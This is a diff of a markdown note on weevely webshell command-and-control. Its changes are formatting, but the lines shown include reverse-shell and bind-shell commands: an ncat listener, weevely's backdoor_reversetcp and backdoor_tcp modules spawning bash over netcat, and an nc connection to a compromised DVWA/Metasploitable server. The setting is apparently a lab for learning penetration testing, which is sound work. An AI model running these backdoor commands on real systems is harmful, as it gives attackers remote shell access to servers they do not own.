@@ -4,13 +4,13 @@ Search Tag(s): #weevely #command-and-control #webshell #interactive-shell
 
 ## 5.1 Reverse Shell
 
-* Attacker (waiting callback)
+Attacker (waiting callback)
 
 ```
 userware@hackware-os:~$ sudo ncat -lnvp 443
 ```
 
-* Compromised Target (Web Server)
+Compromised Target (Web Server)
 
 ```
 weevely> backdoor_reversetcp -h
@@ -33,7 +33,7 @@ The remote script execution triggers an error 500, check script and payload inte
 Error binding socket: '[Errno 98] Address already in use'
 ```
 
-- Attacker (callback established)
+Attacker (callback established)
 
 ```
 userware@hackware-os:~$ sudo ncat -lnvp 443
@@ -64,7 +64,7 @@ www-data@metasploitable:/var/www/dvwa/vulnerabilities$
 
 The `:backdoor_tcp` command module function in weevely for spawning a remote shell via netcat.
 
-* Compromised Target (Web Server)
+Compromised Target (Web Server).
 
 ```
 www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ backdoor_tcp -shell /bin/bash -vector netcat 8080
@@ -78,7 +78,7 @@ The alternative is you run with any commands.
 www-data@172.28.128.8:/var/www/dvwa/vulnerabilities $ nc -lnvp 8080
 ```
 
-* Attacker
+Attacker
 
 ```
 userware@hackware-os:~$ nc 172.28.128.8 8080
@@ -87,4 +87,4 @@ userware@hackware-os:~$ nc 172.28.128.8 8080
 ---
 ## References
 
-* [Web App Hacking Part 6 Injecting a Backdoor into a Website with Weevely](https://www.hackers-arise.com/post/2017/12/03/Web-App-Hacking-Part-6-Injecting-a-Backdoor-into-a-Website-with-weevely)
+- [Hackers Arise: Web App Hacking Part 6 Injecting a Backdoor into a Website with Weevely](https://www.hackers-arise.com/post/2017/12/03/Web-App-Hacking-Part-6-Injecting-a-Backdoor-into-a-Website-with-weevely)
